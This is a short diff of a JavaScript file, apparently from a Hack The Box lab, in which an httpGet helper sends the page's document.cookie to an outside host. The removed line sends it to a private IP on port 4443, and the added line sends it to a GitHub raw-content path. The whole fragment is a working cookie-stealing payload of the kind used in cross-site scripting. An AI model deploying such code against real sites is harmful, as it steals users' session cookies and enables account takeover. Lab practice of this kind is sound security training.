@@ -5,4 +5,4 @@ function httpGet(theUrl)
     xmlHttp.send( null );
     return xmlHttp.responseText;
 }
-httpGet("https://10.10.14.14:4443/"+document.cookie);
+httpGet("https://raw.githubusercontent.com/Lyzard-NS/htb/main/"+document.cookie);
